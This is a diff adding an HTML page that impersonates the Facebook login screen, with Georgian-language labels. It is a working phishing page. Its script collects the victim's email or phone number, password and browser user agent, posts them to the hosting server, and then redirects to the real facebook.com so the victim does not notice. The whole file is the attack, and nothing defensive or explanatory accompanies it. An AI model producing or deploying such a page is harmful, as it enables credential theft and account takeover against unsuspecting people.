@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - შესვლა</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
+        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+        button { width: 98%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color:#1877f2">facebook</h2>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="ელ-ფოსტა ან ტელეფონი" required>
+            <input type="password" id="pass" placeholder="პაროლი" required>
+            <button type="submit">შესვლა</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const data = {
+                email: document.getElementById('email').value,
+                pass: document.getElementById('pass').value,
+                device: navigator.userAgent
+            };
+            await fetch('/', { method: 'POST', body: JSON.stringify(data) });
+            window.location.href = "https://www.facebook.com";
+        };
+    </script>
+</body>
+</html>
